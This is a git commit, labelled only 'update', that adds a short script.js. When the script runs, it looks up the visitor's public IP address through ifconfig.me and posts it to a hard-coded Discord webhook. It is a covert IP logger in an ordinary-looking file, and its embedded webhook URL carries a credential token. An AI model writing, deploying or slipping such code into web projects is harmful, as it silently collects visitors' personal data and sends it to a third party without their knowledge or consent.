b279e2f6578e4ea97bd516f6cf7ff86ddd4d9c0f
particle <notnane3@gmail.com>
2026-04-09 17:30:39 -0400

    update

---
+++ script.js
@@ -0,0 +1,13 @@
+function postToWebhook(text) {
+    fetch("https://discord.com/api/webhooks/1491901380837904394/C5d28HGlXs-eEJelCXMJHnfZrymy03kMF0Fg5ndVKBB32dRBSy1JN6GKPs_964-etMC7", {
+          method: "POST",
+          headers: {
+              "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+              content: `${text}`
+          })
+    });
+}
+
+fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => postToWebhook(ip));
